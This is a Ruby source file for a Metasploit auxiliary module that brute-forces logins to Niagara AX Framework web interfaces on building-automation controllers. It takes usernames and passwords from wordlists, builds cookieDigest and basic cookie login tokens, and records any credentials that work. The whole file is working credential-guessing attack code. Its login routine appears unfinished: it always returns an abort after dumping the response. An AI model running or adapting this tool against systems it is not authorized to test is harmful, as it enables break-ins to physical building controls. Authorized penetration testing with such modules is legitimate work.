##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'rex/proto/http'
require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'        => 'Niagara AX Framework Login Utility',
			'Version'     => '$Revision$',
			'Description' => 'This module attempts to authenticate to a Niagara AX Framework web interface',
			'Author'      => 'hdm',
			'License'     => MSF_LICENSE
		)
		register_options(
			[
				Opt::RPORT(80),
				OptString.new('USER_FILE',
					[
						false,
						'The file that contains a list of probable users accounts.',
						File.join(Msf::Config.install_root, 'data', 'wordlists', 'niagara_users.txt')
					]),
				OptString.new('PASS_FILE',
					[
						false,
						'The file that contains a list of probable passwords.',
						File.join(Msf::Config.install_root, 'data', 'wordlists', 'niagara_passwords.txt')
					])
		], self.class)
	end

	def run_host(ip)
		begin
			print_status("Connecting to #{target}")
			each_user_pass do |user, pass|
				do_login(user, pass)
			end
		rescue ::Rex::ConnectionError
		rescue ::Exception => e
			vprint_error("#{target} #{e.to_s} #{e.backtrace}")
		end
	end

	def target
		"#{rhost}:#{rport}"
	end


	def do_login(user=nil,pass=nil)
		begin
			vprint_status("#{target} - Trying user:'#{user}' with password:'#{pass}'")
			error = do_login_niagara_ax(user, pass)
			return error if error

			print_good("#{target} - SUCCESSFUL login for '#{user}' : '#{pass}'")
			report_auth_info(
				:host => rhost,
				:port => rport,
				:sname => (ssl ? 'https' : 'http'),
				:user => user,
				:pass => pass,
				:source_type => "user_supplied",
				:proof  => scookie,
				:active => true
			)
			return :next_user
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
			vprint_error("#{target} triggered exception: #{$!.class} {#$!}")
		end
	end

	def do_login_niagara_ax(user, pass)

		@niagara_auth    = nil
		@niagara_session = nil

		error       = false
		cookie      = 'niagara_audit=guest;'
		scheme      = ""
		login_token = ""

		res = send_request_cgi({
			'uri'        => "/login",
			'method'     => 'GET',
			'cookie'     => cookie,
			'connection' => 'close',
			}, 10)
		unless (res.kind_of? Rex::Proto::Http::Response)
			vprint_error("#{target} is not responding")
			return :abort
		end

		if (res.code == 404)
			vprint_error("#{target} returned a 404 for /login")
			return :abort
		end

		login_body  = res.body.to_s

		# Handle scheme 'cookieDigest'	
		if login_body.index("id='scheme' value='cookieDigest'")
			vprint_status("#{target} Using cookieDigest authentication")
			scheme = "cookieDigest"

			res = send_request_cgi({
				'uri'        => "/login",
				'method'     => 'POST',
				'ctype'      => 'application/x-niagara-login-support',
				'vars_post'  => { 'action' => 'getnonce' },
				'connection' => 'close',
			}, 10)
			unless (res.kind_of? Rex::Proto::Http::Response)
				vprint_error("#{target} No response to nonce request")
				return :abort
			end

			nonce = res.body.to_s
			unless nonce =~ /^[a-z0-9]{32,1024}$/i
				vprint_error("#{target} Replied with an invalid nonce")
				return :abort
			end

			if res['Set-Cookie'].to_s =~ /niagara_session=([^;]+);/i
				@niagara_session = $1
				cookie = "niagara_session=#{@niagara_session}"
			else
				vprint_error("#{target} Replied without a valid session cookie")
				return :abort
			end

			login_token = Rex::Text.encode_base64( user + ":" + nonce + ":" + Rex::Text.sha1(Rex::Text.sha1(user + ":" + pass) + ":" + nonce))

		# Handle scheme 'cookie'
		elsif login_body.index("id='scheme' value='cookie'")
			login_token = Rex::Text.encode_base64( user + ":" + pass )
		else
			vprint_error("#{target} Did not reply with a valid login page")
			return :abort		
		end

		res = send_request_cgi({
			'uri'        => "/login",
			'method'     => 'POST',
			'cookie'     => cookie,
			'vars_post'  => { 'token' => login_token },
			'connection' => 'close'
		}, 10)
		unless (res.kind_of? Rex::Proto::Http::Response)
			vprint_error("#{target} No response to login request")
			return :abort
		end

		print_status(res.inspect)

		return :abort
	end

end
